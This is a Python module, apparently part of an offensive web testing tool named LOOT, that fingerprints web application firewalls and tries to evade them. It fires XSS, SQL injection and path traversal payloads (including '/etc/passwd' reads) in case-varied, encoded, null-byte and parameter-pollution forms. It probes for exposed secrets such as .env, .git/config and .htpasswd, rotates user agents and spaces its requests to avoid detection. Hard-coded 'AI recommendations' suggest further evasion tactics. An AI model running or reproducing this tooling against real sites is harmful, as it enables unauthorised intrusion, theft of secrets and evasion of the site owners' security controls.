#!/usr/bin/env python3
"""
Stealth Module for LOOT - Advanced WAF Bypass and Evasion Techniques
Author: Sayer Linux (SayerLinux1@gmail.com)
"""

import requests
import random
import time
import re
import base64
import urllib.parse
from colorama import Fore, Style
import json
import subprocess

class StealthModule:
    def __init__(self):
        self.timeout = 30
        self.threads = 10
        self.stealth_mode = True
        self.ai_powered = True
        self.verbose = False
        
        # User agents for rotation
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]
        
        # WAF detection signatures
        self.waf_signatures = {
            'Cloudflare': ['cloudflare', 'cf-ray', 'cloudflare-nginx'],
            'AWS WAF': ['awselb', 'awsalb', 'aws-waf'],
            'Akamai': ['akamai', 'ghost', 'akamai-ghost'],
            'Incapsula': ['incapsula', 'visid_incap', 'incap_ses'],
            'Sucuri': ['sucuri', 'x-sucuri', 'access-denied'],
            'ModSecurity': ['mod_security', 'modsecurity', 'not acceptable'],
            'F5 BIG-IP': ['bigip', 'f5', 'tmui'],
            'Barracuda': ['barracuda', 'barra', 'cuda'],
            'Fortinet': ['fortinet', 'fortigate', 'fortiweb'],
            'Citrix': ['citrix', 'netscaler', 'ns-cache'],
            'Imperva': ['imperva', 'securesphere', 'incapsula'],
            'Wordfence': ['wordfence', 'wf-block'],
            'Sitelock': ['sitelock', 'site-lock'],
            'StackPath': ['stackpath', 'sp-edge'],
            'Fastly': ['fastly', 'x-fastly']
        }
        
        # Bypass techniques
        self.bypass_techniques = {
            'case_variation': self.case_variation_bypass,
            'encoding': self.encoding_bypass,
            'comment_injection': self.comment_injection_bypass,
            'null_byte': self.null_byte_bypass,
            'hpp': self.hpp_bypass,
            'unicode': self.unicode_bypass,
            'double_encoding': self.double_encoding_bypass,
            'path_traversal': self.path_traversal_bypass,
            'time_based': self.time_based_bypass
        }
        
        # Common WAF bypass payloads
        self.bypass_payloads = [
            "<script>alert(1)</script>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1#",
            "' or 1=1--",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]

    def bypass_waf(self, target):
        """Main WAF bypass function"""
        print(f"{Fore.CYAN}[*] Starting WAF bypass operations on {target}{Style.RESET_ALL}")
        
        results = {
            'waf_detected': False,
            'waf_type': None,
            'bypass_techniques': {},
            'successful_bypasses': [],
            'vulnerabilities': [],
            'hidden_files': [],
            'sensitive_endpoints': []
        }
        
        try:
            # Detect WAF
            waf_info = self.detect_waf(target)
            results['waf_detected'] = waf_info['detected']
            results['waf_type'] = waf_info['type']
            
            if waf_info['detected']:
                print(f"{Fore.YELLOW}[!] WAF Detected: {waf_info['type']}{Style.RESET_ALL}")
                
                # Attempt bypass techniques
                bypass_results = self.attempt_bypass(target, waf_info['type'])
                results['bypass_techniques'] = bypass_results
                results['successful_bypasses'] = [tech for tech, success in bypass_results.items() if success]
                
                if results['successful_bypasses']:
                    print(f"{Fore.GREEN}[+] Successful bypass techniques: {', '.join(results['successful_bypasses'])}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[-] No successful bypass techniques found{Style.RESET_ALL}")
            
            # Find hidden files using stealth techniques
            hidden_files = self.find_hidden_files(target)
            results['hidden_files'] = hidden_files
            
            # Find sensitive endpoints
            sensitive_endpoints = self.find_sensitive_endpoints(target)
            results['sensitive_endpoints'] = sensitive_endpoints
            
            # Generate AI-powered bypass recommendations
            if self.ai_powered:
                ai_recommendations = self.generate_ai_bypass_recommendations(target, results)
                results['ai_recommendations'] = ai_recommendations
            
            # Create vulnerability entries for discovered issues
            for file_info in hidden_files:
                if file_info.get('accessible'):
                    vuln = {
                        'id': f'stealth_hidden_file_{len(results["vulnerabilities"]) + 1}',
                        'name': 'Hidden File Exposed',
                        'severity': 'medium',
                        'description': f'Hidden file {file_info["path"]} is accessible',
                        'location': file_info['url'],
                        'type': 'information_disclosure',
                        'proof': f'HTTP {file_info.get("status_code", "unknown")} response',
                        'recommendation': 'Remove or protect hidden files from public access'
                    }
                    results['vulnerabilities'].append(vuln)
            
            for endpoint in sensitive_endpoints:
                vuln = {
                    'id': f'stealth_sensitive_endpoint_{len(results["vulnerabilities"]) + 1}',
                    'name': 'Sensitive Endpoint Exposed',
                    'severity': 'high',
                    'description': f'Sensitive endpoint {endpoint["path"]} is accessible',
                    'location': endpoint['url'],
                    'type': 'information_disclosure',
                    'proof': f'HTTP {endpoint.get("status_code", "unknown")} response',
                    'recommendation': 'Protect sensitive endpoints with proper authentication'
                }
                results['vulnerabilities'].append(vuln)
            
        except Exception as e:
            print(f"{Fore.RED}[-] Error in stealth operations: {e}{Style.RESET_ALL}")
        
        return results

    def detect_waf(self, target):
        """Detect if WAF is present and identify type"""
        waf_info = {'detected': False, 'type': None}
        
        try:
            # Send a potentially malicious request
            test_payloads = [
                "<script>alert(1)</script>",
                "' OR 1=1--",
                "../../../etc/passwd"
            ]
            
            session = requests.Session()
            session.headers.update({'User-Agent': random.choice(self.user_agents)})
            
            for payload in test_payloads:
                try:
                    response = session.get(f"{target}?test={urllib.parse.quote(payload)}", 
                                       timeout=self.timeout)
                    
                    # Check response headers and content for WAF signatures
                    headers_str = str(response.headers).lower()
                    content_str = response.text.lower()
                    
                    for waf_name, signatures in self.waf_signatures.items():
                        for signature in signatures:
                            if signature.lower() in headers_str or signature.lower() in content_str:
                                waf_info['detected'] = True
                                waf_info['type'] = waf_name
                                return waf_info
                    
                    # Check for common WAF response patterns
                    if response.status_code in [403, 406, 409, 501, 503]:
                        # Additional checks for WAF-specific responses
                        if any(keyword in content_str for keyword in ['blocked', 'forbidden', 'security', 'firewall']):
                            waf_info['detected'] = True
                            waf_info['type'] = 'Unknown WAF'
                            return waf_info
                
                except requests.RequestException:
                    continue
            
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[-] WAF detection error: {e}{Style.RESET_ALL}")
        
        return waf_info

    def attempt_bypass(self, target, waf_type):
        """Attempt various bypass techniques"""
        bypass_results = {}
        
        print(f"{Fore.CYAN}[*] Attempting WAF bypass techniques...{Style.RESET_ALL}")
        
        for technique_name, technique_func in self.bypass_techniques.items():
            try:
                success = technique_func(target)
                bypass_results[technique_name] = success
                
                if success:
                    print(f"{Fore.GREEN}[+] {technique_name} bypass successful{Style.RESET_ALL}")
                elif self.verbose:
                    print(f"{Fore.YELLOW}[-] {technique_name} bypass failed{Style.RESET_ALL}")
                    
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.RED}[-] Error in {technique_name}: {e}{Style.RESET_ALL}")
                bypass_results[technique_name] = False
        
        return bypass_results

    def case_variation_bypass(self, target):
        """Test case variation bypass"""
        try:
            session = requests.Session()
            session.headers.update({'User-Agent': random.choice(self.user_agents)})
            
            # Test with case variations
            test_payloads = [
                "<ScRiPt>alert(1)</ScRiPt>",
                "<SCRIPT>alert(1)</SCRIPT>",
                "' Or 1=1--",
                "ADMIN'--",
                "..%2F..%2F..%2Fetc%2Fpasswd"
            ]
            
            for payload in test_payloads:
                response = session.get(f"{target}?test={urllib.parse.quote(payload)}", 
                                   timeout=self.timeout)
                
                # If we get a successful response (not blocked), bypass might work
                if response.status_code == 200 and not self.is_waf_response(response):
                    return True
            
            return False
            
        except Exception:
            return False

    def encoding_bypass(self, target):
        """Test encoding bypass techniques"""
        try:
            session = requests.Session()
            session.headers.update({'User-Agent': random.choice(self.user_agents)})
            
            # Test with various encodings
            test_payloads = [
                urllib.parse.quote("<script>alert(1)</script>"),
                base64.b64encode(b"<script>alert(1)</script>").decode(),
                urllib.parse.quote_plus("../../../etc/passwd"),
                "&#60;script&#62;alert(1)&#60;/script&#62;"  # HTML encoding
            ]
            
            for payload in test_payloads:
                response = session.get(f"{target}?test={payload}", timeout=self.timeout)
                
                if response.status_code == 200 and not self.is_waf_response(response):
                    return True
            
            return False
            
        except Exception:
            return False

    def comment_injection_bypass(self, target):
        """Test comment injection bypass"""
        try:
            session = requests.Session()
            session.headers.update({'User-Agent': random.choice(self.user_agents)})
            
            # Test with comment injection
            test_payloads = [
                "<script>alert(1)<!-- comment --></script>",
                "' OR 1=1-- comment",
                "../../../etc/passwd<!-- comment -->",
                "<script>alert(1)/* comment */</script>"
            ]
            
            for payload in test_payloads:
                response = session.get(f"{target}?test={urllib.parse.quote(payload)}", 
                                   timeout=self.timeout)
                
                if response.status_code == 200 and not self.is_waf_response(response):
                    return True
            
            return False
            
        except Exception:
            return False

    def null_byte_bypass(self, target):
        """Test null byte injection bypass"""
        try:
            session = requests.Session()
            session.headers.update({'User-Agent': random.choice(self.user_agents)})
            
            # Test with null bytes
            test_payloads = [
                "<script>alert(1)%00</script>",
                "' OR 1=1%00--",
                "../../../etc/passwd%00",
                "<script>alert(1)\x00</script>"
            ]
            
            for payload in test_payloads:
                response = session.get(f"{target}?test={payload}", timeout=self.timeout)
                
                if response.status_code == 200 and not self.is_waf_response(response):
                    return True
            
            return False
            
        except Exception:
            return False

    def hpp_bypass(self, target):
        """Test HTTP Parameter Pollution bypass"""
        try:
            session = requests.Session()
            session.headers.update({'User-Agent': random.choice(self.user_agents)})
            
            # Test with parameter pollution
            test_url = f"{target}?test=<script>alert(1)</script>&test=normal"
            response = session.get(test_url, timeout=self.timeout)
            
            if response.status_code == 200 and not self.is_waf_response(response):
                return True
            
            return False
            
        except Exception:
            return False

    def unicode_bypass(self, target):
        """Test Unicode encoding bypass"""
        try:
            session = requests.Session()
            session.headers.update({'User-Agent': random.choice(self.user_agents)})
            
            # Test with Unicode encoding
            test_payloads = [
                "%u003cscript%u003ealert(1)%u003c/script%u003e",
                "%c0%af%c0%af%c0%afetc/passwd",
                "%252e%252e%252fetc%252fpasswd"
            ]
            
            for payload in test_payloads:
                response = session.get(f"{target}?test={payload}", timeout=self.timeout)
                
                if response.status_code == 200 and not self.is_waf_response(response):
                    return True
            
            return False
            
        except Exception:
            return False

    def double_encoding_bypass(self, target):
        """Test double encoding bypass"""
        try:
            session = requests.Session()
            session.headers.update({'User-Agent': random.choice(self.user_agents)})
            
            # Test with double encoding
            test_payloads = [
                "%253cscript%253ealert(1)%253c/script%253e",
                "%2525252e%2525252e%2525252fetc%2525252fpasswd"
            ]
            
            for payload in test_payloads:
                response = session.get(f"{target}?test={payload}", timeout=self.timeout)
                
                if response.status_code == 200 and not self.is_waf_response(response):
                    return True
            
            return False
            
        except Exception:
            return False

    def path_traversal_bypass(self, target):
        """Test path traversal bypass"""
        try:
            session = requests.Session()
            session.headers.update({'User-Agent': random.choice(self.user_agents)})
            
            # Test with path traversal variations
            test_payloads = [
                "....//....//....//etc/passwd",
                "..\\..\\..\\..\\etc\\passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
                "%c0%ae%c0%ae%c0%afetc/passwd"
            ]
            
            for payload in test_payloads:
                response = session.get(f"{target}?file={payload}", timeout=self.timeout)
                
                if response.status_code == 200 and ('root:' in response.text or not self.is_waf_response(response)):
                    return True
            
            return False
            
        except Exception:
            return False

    def time_based_bypass(self, target):
        """Test time-based bypass"""
        try:
            session = requests.Session()
            session.headers.update({'User-Agent': random.choice(self.user_agents)})
            
            # Test with time delays
            test_payloads = [
                "<script>alert(1)</script>",
                "' OR SLEEP(5)--",
                "../../../etc/passwd"
            ]
            
            for payload in test_payloads:
                start_time = time.time()
                response = session.get(f"{target}?test={urllib.parse.quote(payload)}", 
                                   timeout=self.timeout)
                end_time = time.time()
                
                # If response took longer than expected, might indicate bypass
                if (response.status_code == 200 and 
                    not self.is_waf_response(response) and 
                    (end_time - start_time) > 2):
                    return True
            
            return False
            
        except Exception:
            return False

    def is_waf_response(self, response):
        """Check if response indicates WAF blocking"""
        if response.status_code in [403, 406, 409, 501, 503]:
            return True
        
        content = response.text.lower()
        waf_indicators = [
            'blocked', 'forbidden', 'security', 'firewall', 'denied',
            'suspicious', 'malicious', 'attack', 'violation'
        ]
        
        return any(indicator in content for indicator in waf_indicators)

    def find_hidden_files(self, target):
        """Find hidden files using stealth techniques"""
        hidden_files = []
        
        # Common hidden files and directories
        hidden_paths = [
            '.htaccess', '.htpasswd', '.git/config', '.git/HEAD', '.svn/entries',
            '.DS_Store', 'backup.zip', 'backup.tar.gz', 'config.bak', 'web.config',
            'phpinfo.php', 'info.php', 'test.php', 'admin.php', 'login.php.bak',
            'database.sql', 'db.sql', 'users.sql', 'config.php.bak', 'settings.bak',
            '.env', '.env.local', '.env.production', 'docker-compose.yml',
            'package.json', 'composer.json', 'requirements.txt', 'Gemfile',
            'robots.txt', 'sitemap.xml', 'crossdomain.xml', 'clientaccesspolicy.xml',
            '.well-known/security.txt', '.well-known/robots.txt',
            'api/docs', 'api/documentation', 'swagger.json', 'openapi.json',
            '_config.yml', '_admin', '_backup', '_old', '_test', '_dev'
        ]
        
        session = requests.Session()
        session.headers.update({'User-Agent': random.choice(self.user_agents)})
        
        for path in hidden_paths:
            try:
                url = f"{target.rstrip('/')}/{path}"
                
                # Try different bypass techniques for each file
                for technique_name in ['normal', 'case_variation', 'encoding']:
                    if technique_name == 'case_variation':
                        test_url = url.replace('.php', '.PHP').replace('.sql', '.SQL')
                    elif technique_name == 'encoding':
                        test_url = urllib.parse.quote(url, safe='/')
                    else:
                        test_url = url
                    
                    response = session.get(test_url, timeout=self.timeout)
                    
                    if response.status_code == 200:
                        file_info = {
                            'path': path,
                            'url': test_url,
                            'status_code': response.status_code,
                            'size': len(response.content),
                            'content_type': response.headers.get('content-type', 'unknown'),
                            'accessible': True,
                            'bypass_technique': technique_name
                        }
                        hidden_files.append(file_info)
                        
                        if self.verbose:
                            print(f"{Fore.GREEN}[+] Found hidden file: {path}{Style.RESET_ALL}")
                        break
                
                # Add delay to avoid rate limiting
                time.sleep(random.uniform(0.5, 1.5))
                
            except requests.RequestException:
                continue
        
        return hidden_files

    def find_sensitive_endpoints(self, target):
        """Find sensitive endpoints using stealth techniques"""
        sensitive_endpoints = []
        
        # Common sensitive endpoints
        sensitive_paths = [
            'admin', 'administrator', 'manage', 'management', 'dashboard',
            'control', 'panel', 'cpanel', 'webadmin', 'sysadmin',
            'config', 'configuration', 'settings', 'preferences',
            'api', 'api/v1', 'api/v2', 'rest', 'graphql',
            'login', 'signin', 'authenticate', 'auth',
            'logout', 'signout', 'exit',
            'register', 'signup', 'create_account',
            'profile', 'user', 'users', 'account',
            'upload', 'uploads', 'files', 'file_manager',
            'backup', 'backups', 'archive', 'archives',
            'database', 'db', 'phpmyadmin', 'mysql', 'pgsql',
            'test', 'testing', 'debug', 'development', 'dev',
            'logs', 'log', 'error_log', 'access_log',
            'temp', 'tmp', 'cache', 'sessions',
            'install', 'installation', 'setup', 'configure',
            'wp-admin', 'wp-login', 'wordpress', 'drupal', 'joomla',
            'phpinfo', 'info', 'php_version', 'server_info',
            '.git', '.svn', '.hg', '.bzr', '_darcs',
            'robots.txt', 'sitemap.xml', 'humans.txt', 'security.txt'
        ]
        
        session = requests.Session()
        session.headers.update({'User-Agent': random.choice(self.user_agents)})
        
        for path in sensitive_paths:
            try:
                url = f"{target.rstrip('/')}/{path}"
                
                # Try different HTTP methods
                for method in ['GET', 'POST', 'HEAD', 'OPTIONS']:
                    try:
                        if method == 'GET':
                            response = session.get(url, timeout=self.timeout)
                        elif method == 'POST':
                            response = session.post(url, timeout=self.timeout)
                        elif method == 'HEAD':
                            response = session.head(url, timeout=self.timeout)
                        elif method == 'OPTIONS':
                            response = session.options(url, timeout=self.timeout)
                        
                        if response.status_code in [200, 401, 403]:
                            endpoint_info = {
                                'path': path,
                                'url': url,
                                'status_code': response.status_code,
                                'method': method,
                                'accessible': True
                            }
                            
                            if response.status_code == 401:
                                endpoint_info['type'] = 'authentication_required'
                            elif response.status_code == 403:
                                endpoint_info['type'] = 'forbidden'
                            else:
                                endpoint_info['type'] = 'accessible'
                            
                            sensitive_endpoints.append(endpoint_info)
                            
                            if self.verbose:
                                print(f"{Fore.YELLOW}[!] Found sensitive endpoint: {path} ({response.status_code}){Style.RESET_ALL}")
                            break
                            
                    except requests.RequestException:
                        continue
                
                # Add delay to avoid rate limiting
                time.sleep(random.uniform(0.3, 1.0))
                
            except Exception:
                continue
        
        return sensitive_endpoints

    def generate_ai_bypass_recommendations(self, target, results):
        """Generate AI-powered bypass recommendations"""
        recommendations = []
        
        if results['waf_detected'] and results['waf_type']:
            waf_type = results['waf_type']
            
            # Generate specific recommendations based on WAF type
            if waf_type == 'Cloudflare':
                recommendations.extend([
                    "Try using Cloudflare bypass techniques with Workers",
                    "Use legitimate Cloudflare IP ranges for requests",
                    "Attempt bypass during Cloudflare maintenance windows",
                    "Use Cloudflare's own CDN endpoints"
                ])
            elif waf_type == 'AWS WAF':
                recommendations.extend([
                    "Exploit AWS WAF rate limiting thresholds",
                    "Use AWS internal endpoints if accessible",
                    "Try bypassing during AWS maintenance",
                    "Use legitimate AWS IP ranges"
                ])
            elif waf_type == 'ModSecurity':
                recommendations.extend([
                    "Exploit ModSecurity rule exceptions",
                    "Use ModSecurity CRS bypass techniques",
                    "Try older ModSecurity versions",
                    "Use legitimate request patterns"
                ])
            else:
                recommendations.extend([
                    f"Research specific {waf_type} bypass techniques",
                    "Try combination of multiple bypass methods",
                    "Use legitimate request patterns",
                    "Exploit WAF configuration weaknesses"
                ])
        
        # Add general recommendations
        recommendations.extend([
            "Use legitimate user agents and headers",
            "Implement request rate limiting",
            "Use proxy rotation for requests",
            "Time requests to avoid detection",
            "Use legitimate business logic patterns"
        ])
        
        return recommendations

    def scan_target(self, target):
        """Alias for bypass_waf to maintain compatibility"""
        return self.bypass_waf(target)